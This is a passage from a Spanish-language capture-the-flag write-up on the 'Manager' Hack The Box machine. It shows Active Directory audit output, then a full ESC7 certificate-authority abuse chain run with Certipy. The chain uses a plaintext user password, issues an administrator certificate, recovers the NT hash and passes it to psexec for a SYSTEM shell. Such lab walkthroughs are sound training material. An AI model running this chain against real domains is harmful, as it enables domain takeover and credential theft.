[*] No Fine-Grained Password Policies configured

[?] Searching for domain trusts...                                                                                                                                                                                                          
[*] No external domain trusts found (isolated domain)

[?] Analyzing LDAP Signing/Channel Binding via GPO (SYSVOL)...                                                                                                                                                                              
[+] Found LDAP security configuration in 2 GPO(s):
displayName:                                 Default Domain Policy
Name:                                        {31B2F340-016D-11D2-945F-00C04FB984F9}
distinguishedName:                           CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=manager,DC=htb
gPCFileSysPath:                              \\manager.htb\sysvol\manager.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
[#] LDAPSigning:                             Required
[+] ChannelBinding:                          Not Configured
[#] AnonymousBinding:                        Restricted
Scope:                                       Domain-wide (1 link(s))
LinkedOUs:                                   DC=manager,DC=htb
IsEffectiveSetting:                          False

displayName:                                 Default Domain Controllers Policy
Name:                                        {6AC1786C-016F-11D2-945F-00C04fB984F9}
distinguishedName:                           CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=manager,DC=htb
gPCFileSysPath:                              \\manager.htb\sysvol\manager.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
[+] LDAPSigning:                             Optional
[+] ChannelBinding:                          Not Configured
[+] AnonymousBinding:                        Not Configured
Scope:                                       1 OU(s)
LinkedOUs:                                   OU=Domain Controllers,DC=manager,DC=htb
IsEffectiveSetting:                          True


[?] Analyzing SMB Signing configuration via GPO (SYSVOL)...                                                                                                                                                                                 
[+] Found SMB Signing configuration in 1 GPO(s):
displayName:                                 Default Domain Controllers Policy
Name:                                        {6AC1786C-016F-11D2-945F-00C04fB984F9}
distinguishedName:                           CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=manager,DC=htb
gPCFileSysPath:                              \\manager.htb\sysvol\manager.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
[#] ServerSigning:                           Required
[+] ClientSigning:                           Not configured
Scope:                                       1 OU(s)
LinkedOUs:                                   OU=Domain Controllers,DC=manager,DC=htb
IsEffectiveSetting:                          True

[+] SMB Signing only configured for Domain Controllers - Member Servers and Clients rely on OS defaults (varies by version)


======================================================================
+++++ [2/10] Analyzing Credential Exposure +++++                                                                                                                                                                                            
======================================================================                                                                                                                                                                      

[?] Testing LAPS password read access for current user...                                                                                                                                                                                   
[*] No LAPS schema found

[?] Searching for credentials in Group Policy files...                                                                                                                                                                                      
[#] No GPP credentials found in SYSVOL

[?] Searching for sensitive information in SYSVOL/NETLOGON...                                                                                                                                                                               
[#] No sensitive information found in SYSVOL/NETLOGON scripts

[?] Searching for credentials in description/info attributes...                                                                                                                                                                             
[#] No credentials found in description or info attributes

[?] Searching for Kerberoastable accounts (users with SPNs)...                                                                                                                                                                              
[#] No kerberoastable accounts found

[?] Searching for AS-REP Roastable accounts (DONT_REQ_PREAUTH)...                                                                                                                                                                           
[#] No AS-REP Roastable accounts found

[?] Searching for accounts with readable password attributes...                                                                                                                                                                             
[#] No accounts with readable password attributes found


======================================================================
+++++ [3/10] Analyzing Access Permissions +++++                                                                                                                                                                                             
======================================================================                                                                                                                                                                      

[?] Analyzing Domain root ACLs...                                                                                                                                                                                                           
[#] No dangerous ACLs detected on domain root

[?] Analyzing OU permissions...                                                                                                                                                                                                             
[#] No dangerous OU permissions detected in 1 analyzed OU(s)

[?] Analyzing password reset rights on OUs with privileged users...                                                                                                                                                                         
[#] No dangerous password reset rights detected in 1 analyzed OU(s)

[?] Analyzing Add Computer to Domain rights...                                                                                                                                                                                              
[#] ms-DS-MachineAccountQuota is 0 - computer creation restricted to explicit permissions
[+] Found 1 GPO(s) configuring SeMachineAccountPrivilege:
displayName:                                 Default Domain Controllers Policy
Name:                                        {6AC1786C-016F-11D2-945F-00C04fB984F9}
distinguishedName:                           CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=manager,DC=htb
gPCFileSysPath:                              \\manager.htb\sysvol\manager.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
[+] Accounts:                                NT AUTHORITY\Authenticated Users
Scope:                                       1 OU(s)
LinkedOUs:                                   OU=Domain Controllers,DC=manager,DC=htb
IsEffectiveSetting:                          True


[?] Analyzing LAPS read permissions by OU...                                                                                                                                                                                                
[*] No LAPS schema found


======================================================================
+++++ [4/10] Analyzing Delegation Settings +++++                                                                                                                                                                                            
======================================================================                                                                                                                                                                      

[?] Searching for accounts with Unconstrained Delegation...                                                                                                                                                                                 
[#] No accounts with Unconstrained Delegation found (excluding Domain Controllers)

[?] Searching for accounts with Constrained Delegation...                                                                                                                                                                                   
[#] No accounts with Constrained Delegation found

[?] Searching for accounts with RBCD configured...                                                                                                                                                                                          
[#] No accounts with Resource-Based Constrained Delegation found


======================================================================
+++++ [5/10] Analyzing Certificate Services +++++                                                                                                                                                                                           
======================================================================                                                                                                                                                                      

[?] Checking PKI trust infrastructure...                                                                                                                                                                                                    
[*] Found 1 trusted Root CA(s) in AD configuration
Subject:                                     CN=manager-DC01-CA, DC=manager, DC=htb
Issuer:                                      CN=manager-DC01-CA, DC=manager, DC=htb
SerialNumber:                                5150CE6EC048749448C7390A52F264BB
Thumbprint:                                  ACE850A2892B1614526F7F2151EE76E752415023
Validity:                                    2023-07-27 to 2122-07-27
Status:                                      Valid
SignatureAlgorithm:                          sha256RSA
KeySize:                                     2048 bit
HasBasicConstraints:                         True

[*] NTAuth Store contains 1 certificate(s) trusted for domain authentication (PKINIT)
Subject:                                     CN=manager-DC01-CA, DC=manager, DC=htb
Issuer:                                      CN=manager-DC01-CA, DC=manager, DC=htb
SerialNumber:                                5150CE6EC048749448C7390A52F264BB
Thumbprint:                                  ACE850A2892B1614526F7F2151EE76E752415023
Validity:                                    2023-07-27 to 2122-07-27
Status:                                      Valid
SignatureAlgorithm:                          sha256RSA
KeySize:                                     2048 bit
HasBasicConstraints:                         True

[*] Found 1 AIA (Authority Information Access) CA(s)
Subject:                                     CN=manager-DC01-CA, DC=manager, DC=htb
Issuer:                                      CN=manager-DC01-CA, DC=manager, DC=htb
SerialNumber:                                5150CE6EC048749448C7390A52F264BB
Thumbprint:                                  ACE850A2892B1614526F7F2151EE76E752415023
Validity:                                    2023-07-27 to 2122-07-27
Status:                                      Valid
SignatureAlgorithm:                          sha256RSA
KeySize:                                     2048 bit
HasBasicConstraints:                         True


[?] Searching for AD CS Infrastructure...                                                                                                                                                                                                   
[+] Found 1 Certificate Authority(s)
displayName:                                 manager-DC01-CA
sAMAccountName:                              DC01$
dNSHostName:                                 dc01.manager.htb
distinguishedName:                           CN=DC01,OU=Domain Controllers,DC=manager,DC=htb
objectSid:                                   S-1-5-21-4078382237-1492182817-2568127209-1000
operatingSystem:                             Windows Server 2019 Standard
[+] memberOf:                                Pre-Windows 2000 Compatible Access
                                             Cert Publishers
CACertSubject:                               manager-DC01-CA
CACertThumbprint:                            ACE850A2892B1614526F7F2151EE76E752415023
CACertValidity:                              2023-07-27 to 2122-07-27 (Valid)
CACertSignatureAlgorithm:                    sha256RSA
CACertKeySize:                               2048 bit
certificateTemplates:                        SubCA, DirectoryEmailReplication, DomainControllerAuthentication, KerberosAuthentication, EFSRecovery, EFS, DomainController, WebServer, Machine, User, Administrator
CALastModified:                              2023-09-22 21:53:16
[+] pwdlastset:                              10/16/2023 14:00:03
[+] useraccountcontrol:                      TRUSTED_FOR_DELEGATION
                                             SERVER_TRUST_ACCOUNT
dangerousRights:                             MANAGER\DC01$: WriteDacl


[?] Checking PKI container permissions...                                                                                                                                                                                                   
[#] PKI container permissions are properly restricted

[?] Searching for certificate templates...                                                                                                                                                                                                  
[+] Found 3 of 11 templates with non-privileged enrollment


======================================================================
+++++ [6/10] Analyzing Privileged Accounts +++++                                                                                                                                                                                            
======================================================================                                                                                                                                                                      

[?] Searching for privileged group members...                                                                                                                                                                                               
[!] Found 2 user(s), 1 computer(s) across 7 privileged group(s):
sAMAccountName:                              Administrator
distinguishedName:                           CN=Administrator,CN=Users,DC=manager,DC=htb
objectSid:                                   S-1-5-21-4078382237-1492182817-2568127209-500
[!] privilegedGroups:                        Domain Admins (direct)
                                             Group Policy Creator Owners (direct)
                                             Enterprise Admins (direct)
                                             Schema Admins (direct)
                                             Administrators (direct)
description:                                 Built-in account for administering the computer/domain
[#] userAccountControl:                      NOT_DELEGATED
                                             NORMAL_ACCOUNT
                                             DONT_EXPIRE_PASSWORD
[+] pwdLastSet:                              07/27/2023 08:24:35
lastLogonTimestamp:                          05/24/2026 15:38:53
[+] admincount:                              1


sAMAccountName:                              Raven
distinguishedName:                           CN=Raven,CN=Users,DC=manager,DC=htb
objectSid:                                   S-1-5-21-4078382237-1492182817-2568127209-1116
privilegedGroups:                            Remote Management Users (direct)
[+] userAccountControl:                      NORMAL_ACCOUNT
                                             DONT_EXPIRE_PASSWORD
[+] pwdLastSet:                              07/27/2023 08:23:10
lastLogonTimestamp:                          05/24/2026 16:18:26


sAMAccountName:                              DC01$
dNSHostName:                                 dc01.manager.htb
distinguishedName:                           CN=DC01,OU=Domain Controllers,DC=manager,DC=htb
objectSid:                                   S-1-5-21-4078382237-1492182817-2568127209-1000
operatingSystem:                             Windows Server 2019 Standard
[+] privilegedGroups:                        Cert Publishers (direct)
[+] userAccountControl:                      TRUSTED_FOR_DELEGATION
                                             SERVER_TRUST_ACCOUNT
[+] pwdLastSet:                              10/16/2023 14:00:03
lastLogonTimestamp:                          05/24/2026 15:38:49



[?] Checking AdminSDHolder ACLs...                                                                                                                                                                                                          
[#] AdminSDHolder ACLs are secure

[?] Checking Pre-Windows 2000 Compatible Access group...                                                                                                                                                                                    
[+] Authenticated Users is a member

[?] Searching for SID History Injection (privileged SIDs in sIDHistory)...                                                                                                                                                                  
[#] No accounts with privileged SIDs in sIDHistory found

[?] Analyzing Managed Service Account security...                                                                                                                                                                                           
[*] No gMSA accounts found in domain
[*] No standalone MSAs found

[?] Analyzing Protected Users coverage for Tier-0 accounts...                                                                                                                                                                               
[!] Found 1 unprotected Tier-0 account(s) (0 of 1 in Protected Users, 0%):
sAMAccountName:                              Administrator
distinguishedName:                           CN=Administrator,CN=Users,DC=manager,DC=htb
objectSid:                                   S-1-5-21-4078382237-1492182817-2568127209-500
[!] memberOf:                                Group Policy Creator Owners
                                             Domain Admins
                                             Enterprise Admins
                                             Schema Admins
                                             Administrators
description:                                 Built-in account for administering the computer/domain
[#] userAccountControl:                      NOT_DELEGATED
                                             NORMAL_ACCOUNT
                                             DONT_EXPIRE_PASSWORD
[+] pwdLastSet:                              07/27/2023 08:24:35
lastLogonTimestamp:                          05/24/2026 15:38:53
[+] admincount:                              1


[?] Searching for inactive privileged accounts (>180 days)...                                                                                                                                                                               
[#] No inactive privileged accounts found

[?] Searching for privileged accounts with password never expires...                                                                                                                                                                        
[!] Found 1 privileged account(s) with password never expires (password > 365 days old):
sAMAccountName:                              Administrator
distinguishedName:                           CN=Administrator,CN=Users,DC=manager,DC=htb
objectSid:                                   S-1-5-21-4078382237-1492182817-2568127209-500
[!] memberOf:                                Group Policy Creator Owners
                                             Domain Admins
                                             Enterprise Admins
                                             Schema Admins
                                             Administrators
description:                                 Built-in account for administering the computer/domain
[#] userAccountControl:                      NOT_DELEGATED
                                             NORMAL_ACCOUNT
                                             DONT_EXPIRE_PASSWORD
[+] pwdLastSet:                              07/27/2023 08:24:35
lastLogonTimestamp:                          05/24/2026 15:38:53
[+] admincount:                              1


[?] Searching for privileged accounts with reversible encryption...                                                                                                                                                                         
[#] No privileged accounts with reversible password encryption found

[?] Searching for enabled accounts with 'Password Not Required' flag...                                                                                                                                                                     
[+] Found 1 enabled account(s) with 'Password Not Required' flag (PASSWD_NOTREQD)
sAMAccountName:                              Guest
distinguishedName:                           CN=Guest,CN=Users,DC=manager,DC=htb
objectSid:                                   S-1-5-21-4078382237-1492182817-2568127209-501
memberOf:                                    Guests
description:                                 Built-in account for guest access to the computer/domain
[+] userAccountControl:                      PASSWD_NOTREQD
                                             NORMAL_ACCOUNT
                                             DONT_EXPIRE_PASSWORD
pwdLastSet:                                  0
lastLogonTimestamp:                          07/27/2023 05:30:32
[+] activityStatus:                          INACTIVE (no login for >90 days)


[?] Searching for users with non-default owners...                                                                                                                                                                                          
[#] All users have default owners


======================================================================
+++++ [7/10] Analyzing Group Policy Objects +++++                                                                                                                                                                                           
======================================================================                                                                                                                                                                      

[?] Searching for dangerous GPO permissions...                                                                                                                                                                                              
[#] No dangerous GPO permissions found in 2 analyzed GPO(s)

[?] Searching for GPO local group assignments...                                                                                                                                                                                            
[#] No vulnerable GPO local group assignments found in 2 analyzed GPO(s)

[?] Searching for GPO scheduled tasks...                                                                                                                                                                                                    
[*] No scheduled tasks distributed via GPO in 2 analyzed GPO(s)

[?] Searching for GPO-deployed scripts...                                                                                                                                                                                                   
[*] No scripts distributed via GPO


======================================================================
+++++ [8/10] Analyzing Computer Security +++++                                                                                                                                                                                              
======================================================================                                                                                                                                                                      

[?] Searching for Domain Controllers...                                                                                                                                                                                                     
[+] Found 1 Domain Controller(s):
sAMAccountName:                              DC01$
dNSHostName:                                 dc01.manager.htb
distinguishedName:                           CN=DC01,OU=Domain Controllers,DC=manager,DC=htb
objectSid:                                   S-1-5-21-4078382237-1492182817-2568127209-1000
operatingSystem:                             Windows Server 2019 Standard
[+] memberOf:                                Pre-Windows 2000 Compatible Access
                                             Cert Publishers
[+] userAccountControl:                      TRUSTED_FOR_DELEGATION
                                             SERVER_TRUST_ACCOUNT
[+] pwdLastSet:                              10/16/2023 14:00:03
lastLogonTimestamp:                          05/24/2026 15:38:49


[?] Searching for Exchange Servers...                                                                                                                                                                                                       
[*] No Exchange Servers found

[?] Searching for MSSQL Servers...                                                                                                                                                                                                          
[*] No MSSQL Servers found via SPN

[?] Searching for SCCM/ConfigMgr Servers...                                                                                                                                                                                                 
[*] No SCCM Servers found via SPN

[?] Searching for SCOM Servers...                                                                                                                                                                                                           
[*] No SCOM Servers found via SPN

[?] Searching for Entra ID Connect...                                                                                                                                                                                                       
[*] No Entra ID Connect servers found

[?] Searching for computers with non-default owners...                                                                                                                                                                                      
[#] All computers have default owners

[?] Checking for LAPS schema attributes...                                                                                                                                                                                                  
[!] No LAPS schema found - LAPS is not deployed
[!] 1 computers (100%) without LAPS protection
ouName:                                      OU=Domain Controllers,DC=manager,DC=htb
computerCount:                               1
[!] lapsUnprotectedComputers:                DC01


[?] Searching for computers with outdated operating systems...                                                                                                                                                                              
[#] No computers with outdated operating systems found


======================================================================
+++++ [9/10] Analyzing Application Infrastructure +++++                                                                                                                                                                                     
======================================================================                                                                                                                                                                      

[?] Checking for Exchange Organization...                                                                                                                                                                                                   
[*] No Exchange Organization detected

[?] Checking for SCCM/MECM infrastructure...                                                                                                                                                                                                
[*] No SCCM/MECM infrastructure detected

[?] Checking for SCOM infrastructure...                                                                                                                                                                                                     
[*] No SCOM infrastructure detected


======================================================================
+++++ [10/10] Collecting BloodHound Data +++++                                                                                                                                                                                              
======================================================================
```

Tras enumerar el *Active Directory* con *Certipy*, se identificó una configuración vulnerable *ESC7 en la Certificate Authority*. Debido a los permisos de gestión sobre la CA, fue posible emitir un certificado autenticable para el usuario Administrator y posteriormente obtener acceso.
### ESC7: Abuse Permission on CA

Se instala [Certipy](https://github.com/ly4k/Certipy).

```PowerShell
git clone https://github.com/ly4k/Certipy.git
python3 -m venv certipy-venv
source certipy-venv/bin/activate
pip install certipy-ad
```

[ESC7: Dangerous Permissions on CA](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca).

```PowerShell
certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.2.41 -vulnerable -stdout
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'manager-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'manager-DC01-CA'
[*] Checking web enrollment for CA 'manager-DC01-CA' @ 'dc01.manager.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
    [+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates

certipy ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ns '10.129.2.41' -target 'dc01.manager.htb' -ca 'manager-DC01-CA' -add-officer 'raven'
[*] Successfully added officer 'Raven' on 'manager-DC01-CA'

certipy ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ns '10.129.2.41' -target 'dc01.manager.htb' -ca 'manager-DC01-CA' -enable-template 'SubCA'
[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'

certipy req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip '10.129.2.41' -target 'dc01.manager.htb' -ca 'manager-DC01-CA' -template 'SubCA' -upn 'administrator@manager.htb' -sid 'S-1-5-21-...-500'
[*] Requesting certificate via RPC
[*] Request ID is 19
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '19.key'
[*] Wrote private key to '19.key'
[-] Failed to request certificate

certipy ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ns '10.129.2.41' -target 'dc01.manager.htb' -ca 'manager-DC01-CA' -issue-request '19'

certipy req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip '10.129.2.41' -target 'dc01.manager.htb' -ca 'manager-DC01-CA' -retrieve '19'

certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'manager.htb' -dc-ip 10.129.2.41
[*] Certificate identities:
[*]     SAN UPN: 'administrator@manager.htb'
[*]     SAN URL SID: 'S-1-5-21-...-500'
[*]     Security Extension SID: 'S-1-5-21-...-500'
[*] Using principal: 'administrator@manager.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb' : ae5064c2f62317332c88629e025924ef:ae5064c2f62317332c88629e025924ef
```

```PowerShell
impacket-psexec manager.htb/administrator@10.129.2.41 -hashes ae5064c2f62317332c88629e025924ef:ae5064c2f62317332c88629e025924ef
```

Se obtiene una consola interactiva con `nt authority\system`.

La flag de `root` se encuentra en `C:\Users\Administrator\Desktop`.

---
